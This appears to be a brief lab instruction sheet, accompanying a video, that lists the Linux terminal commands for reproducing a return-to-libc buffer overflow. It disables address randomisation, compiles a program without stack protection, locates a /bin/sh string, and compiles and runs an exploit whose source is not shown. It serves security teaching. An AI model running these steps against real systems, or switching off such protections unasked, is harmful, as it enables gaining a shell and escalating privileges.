Execute the commands in order to reproduce the Return-to-libc buffer overflow attack (Linux terminal):
(The video illustrates step-by-step parts of the attack)

sudo sysctl -w kernel.randomize_va_space=0

cat vulnerable.c

sudo gcc -m32 -fno-stack-protector -z noexecstack -o vulnerable vulnerable.c

export MYSHELL=/bin/sh

env | grep MYSHELL

cat shelladdr.c

sudo gcc -m32 -fno-stack-protector -z noexecstack -o shelladdr shelladdr.c

./shelladdr

gdb vulnerable

sudo gcc -m32 -fno-stack-protector -z noexecstack -o exploit exploit.c

./exploit

./vulnerable
